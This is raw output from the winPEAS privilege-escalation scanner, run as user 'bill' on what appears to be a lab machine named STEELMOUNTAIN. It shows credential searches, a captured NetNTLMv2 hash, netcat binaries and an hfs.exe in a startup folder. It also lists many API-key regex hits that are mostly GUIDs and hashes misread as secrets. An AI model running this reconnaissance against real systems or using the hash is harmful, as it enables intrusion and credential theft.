Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

����������͹ Looking AppCmd.exe
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd.exe
    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
      You must be an administrator to run this check

����������͹ Looking SSClient.exe
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scclient-sccm
    Not Found

����������͹ Enumerating SSCM - System Center Configuration Manager settings

����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    bill::STEELMOUNTAIN:1122334455667788:ace201f2181ceffb95988e9b47357e55:010100000000000060b76c0c8595da013e3c88d4de5edd39000000000800300030000000000000000000000000200000d7597aa9021e82b15fa523465e7592b3ad80a89a867f60c399fbd86c0487516a0a00100000000000000000000000000000000000090000000000000000000000                                                                         
                                                                                                                              
   =================================================================================================



�����������������������������������͹ Browsers Information �������������������������������������

����������͹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Firefox DBs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Firefox history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Chrome DBs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Chrome history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Chrome bookmarks
    Not Found

����������͹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Current IE tabs
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in IE history
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#browsers-history


����������͹ IE history -- limit 50
                                                                                                                              
    http://go.microsoft.com/fwlink/p/?LinkId=255141

����������͹ IE favorites
    http://go.microsoft.com/fwlink/p/?LinkId=255142


�����������������������������������͹ Interesting files and registry �������������������������������������

����������͹ Putty Sessions
    Not Found

����������͹ Putty SSH Host keys
    Not Found

����������͹ SSH keys in registry
� If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#ssh-keys-in-registry                                                                     
    Not Found

����������͹ SuperPutty configuration files

����������͹ Enumerating Office 365 endpoints synced by OneDrive.
                                                                                                                              
    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-3029548963-3893655183-1231094572-1001
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


����������͹ Cloud Credentials
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Unattend Files

����������͹ Looking for common SAM & SYSTEM backups

����������͹ Looking for McAfee Sitelist.xml Files

����������͹ Cached GPP Passwords

����������͹ Looking for possible regs with creds
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

����������͹ Looking for possible password files in users homes
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

����������͹ Searching for Oracle SQL Developer config files
                                                                                                                              

����������͹ Slack files & directories
  note: check manually if something is found

����������͹ Looking for LOL Binaries and Scripts (can be slow)
�  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

����������͹ Enumerating Outlook download files
                                                                                                                              

����������͹ Enumerating machine and user certificate files
                                                                                                                              

����������͹ Searching known files that can contain creds in home
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files

����������͹ Looking for documents --limit 100--
    Not Found

����������͹ Office Most Recent Files -- limit 50
                                                                                                                              
  Last Access Date           User                                           Application           Document

����������͹ Recent files --limit 70--
    Not Found

����������͹ Looking inside the Recycle Bin for creds files
�  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Searching hidden files or folders in C:\Users home (can be slow)
                                                                                                                              
     C:\Users\bill\Desktop\BIT4F5D.tmp
     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users
     C:\Users\Default

����������͹ Searching interesting files in other users home directories (can be slow)
                                                                                                                              
     Checking folder: c:\users\administrator
                                                                                                                              
   =================================================================================================


����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\bill\Desktop\winpeas.exe": bill [AllAccess]
     File Permissions "C:\Users\bill\AppData\Local\Microsoft\Windows\INetCache\IE\OGHDAF05\ncat[1].exe": bill [AllAccess]
     File Permissions "C:\Users\bill\AppData\Local\Microsoft\Windows\INetCache\IE\IH88FJB8\winPEASany[1].exe": bill [AllAccess]
     File Permissions "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hfs.exe": bill [AllAccess]
     File Permissions "C:\Users\Public\ncat.exe": bill [AllAccess],Interactive [WriteData/CreateFiles]
     File Permissions "C:\Users\Public\nc.exe": bill [AllAccess],Interactive [WriteData/CreateFiles]

����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe


�����������������������������������͹ File Analysis �������������������������������������

����������͹ Found SSH AGENTS Files
File: C:\Users\All Users\Amazon\SSM\Logs\amazon-ssm-agent.log
                   
����������͹ Found APIs-Adafruit API Key Regexes
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 6bdd1fc6-810f-11d0-bec7-08002be2                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 633bd6e8-0f50-4e28-b330-cc22fa99                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0                                                                                                                           

����������͹ Found APIs-Bittrex Access Key and Access Key Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a35c30a580
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39beccaa96

����������͹ Found APIs-Confluent Access Token & Secret Key Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 023ba5a35c30a580
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: e8298c39beccaa96

����������͹ Found APIs-Droneci Access Token Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a35c30a580
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39beccaa96

����������͹ Found APIs-Etsy Access Token Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a3
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39

����������͹ Found APIs-Flickr Access Token Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a35c30a580
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39beccaa96

����������͹ Found APIs-Mattermost Access Token Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a35c
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39be

����������͹ Found APIs-Nytimes Access Token Regexes
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 6bdd1fc6-810f-11d0-bec7-08002be2                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 026e516e-b814-414b-83cd-856d6fef                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: d5c93de7-5ac4-4698-acea-d9a02385                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 633bd6e8-0f50-4e28-b330-cc22fa99                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 54e6d7d6-c881-495f-8651-c47a803d                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 241ed13e-92eb-4d9e-a47d-be3aff03                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 29e7ef4e-b212-4bf9-b95b-1e073fba                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: 07deb856-fc6e-4fb9-8add-d8f2cf87                                                                                                                           
C:\Users\All Users\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\tasks.xml: c463887e-0db9-46b9-8c73-9de665d0                                                                                                                           

����������͹ Found APIs-Plaid Client ID Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a3
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39

����������͹ Found APIs-Plaid Secret key Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a35c30a5
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39beccaa

����������͹ Found APIs-SumoLogic Access ID Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed1
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 49023ba5a35c30
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 41e8298c39becc

����������͹ Found APIs-Travis CI Access Token Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c

����������͹ Found APIs-Kucoin Access Token Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: 2521bc6f9fbed149023ba5a3
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER48A5.tmp.WERInternalMetadata.xml: d175b1f47d57cc41e8298c39

����������͹ Found APIs-Base32 Regexes
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: DATABASE
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
C:\Users\All Users\Microsoft\Windows\WER\ReportQueue\AppCrash_jenkins.exe_6f8aa3215db274dc49ee4e90f6883d5934f72fe6_def429b2_cab_09d548a3\WER4846.tmp.appcompat.txt: MATCHING
